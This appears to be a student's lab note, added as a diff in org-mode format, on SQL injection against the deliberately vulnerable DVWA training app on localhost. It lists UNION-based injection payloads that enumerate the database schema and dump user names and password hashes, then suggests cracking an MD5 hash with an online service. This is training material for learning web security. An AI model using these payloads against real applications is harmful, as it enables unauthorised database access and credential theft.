@@ -1,0 +1,48 @@
+* LAB: HACKING MYSQL and WEB-APP (dvwa) with sql-injection
+- [ ] https://resources.infosecinstitute.com/anatomy-of-an-attack-gaining-reverse-shell-from-sql-injection/
+- [ ] http://www.computersecuritystudent.com/SECURITY_TOOLS/DVWA/DVWAv107/lesson6/
+ 
+ 
+
+* DIY 1: Identify sql-injection point
+
+#+begin_src bash
+http://localhost:8800/vulnerabilities/sqli/
+
+http://localhost:8800/vulnerabilities/sqli/?id=1&Submit=Submit#
+#+end_src
+
+* DIY 2: use sql injection
+
+#+begin_src bash
+
+select .... from ... where id=' INPUT '
+
+Für INPUT setzt man folg. ein:
+
+1' or 0=0
+
+1' union select null, version() #
+
+1' union select null, user() #
+
+1' union select null, database() #
+
+1' union select null, table_name from information_schema.tables #
+
+1' union select null, table_name from information_schema.tables where table_name like 'user%'#
+
+1' union select null, concat(table_name,0x2e,column_name) from information_schema.columns where table_name = 'users' #
+
+1' union select null, concat(first_name,0x2e,last_name,0x2e,user,0x2e,password) from users #
+
+
+decrypt md5 password-hash with
+https://www.md5online.org/md5-decrypt.html
+
+whats the password of:
+Pablo.Picasso.pablo.0d107d09f5bbe40cade3de5c71e9e9b7
+
+
+#+end_src
+
